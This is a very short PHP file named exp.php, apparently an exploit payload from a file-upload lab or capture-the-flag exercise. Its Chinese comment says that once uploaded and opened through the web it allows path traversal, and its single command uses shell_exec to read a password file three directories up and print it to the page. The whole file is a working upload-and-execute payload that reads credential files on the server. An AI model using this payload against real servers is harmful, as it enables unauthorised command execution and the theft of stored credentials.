<?php
	// exp.php
	// 假如这个文件上传成功，则可以利用 web 打开这个文件进行解析时进行路径穿越
	$content = shell_exec('cat ../../../.passwd');
	echo "<pre>$content</pre>";
?>